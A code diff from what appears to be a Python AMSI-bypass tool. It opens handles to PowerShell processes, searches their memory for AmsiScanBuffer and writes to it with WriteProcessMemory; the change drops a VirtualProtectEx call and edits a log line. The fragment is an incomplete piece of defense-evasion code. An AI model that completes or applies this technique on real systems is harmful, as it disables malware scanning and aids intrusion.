@@ -59,19 +59,6 @@ def writeBuffer(handle, address, buffer):
         c_ulong,
         c_void_p,
     ]
-    KERNEL32.VirtualProtectEx.argtypes = [
-        c_ulong,
-        c_void_p,
-        c_size_t,
-        c_ulong,
-        c_void_p,
-    ]
-
-    res = KERNEL32.VirtualProtectEx(
-        handle, address, len(buffer), PAGE_READWRITE, byref(c_ulong())
-    )
-    if not res:
-        print(f"[-] VirtualProtectEx Error: {KERNEL32.GetLastError()}")
     res = KERNEL32.WriteProcessMemory(
         handle, address, buffer, len(buffer), byref(nBytes)
     )
@@ -138,7 +125,7 @@ for pid in gePowershellPids():
     if not process_handle:
         continue
     print(
-        f"[+] Got process handle of PID powershell at {pid}: {hex(process_handle)}"
+        f"[+] Got process handle of powershell at {pid}: {hex(process_handle)}"
     )
     print(f"[+] Trying to find AmsiScanBuffer in {pid} process memory...")
     amsiDllBaseAddress = getAmsiDllBaseAddress(process_handle, pid)
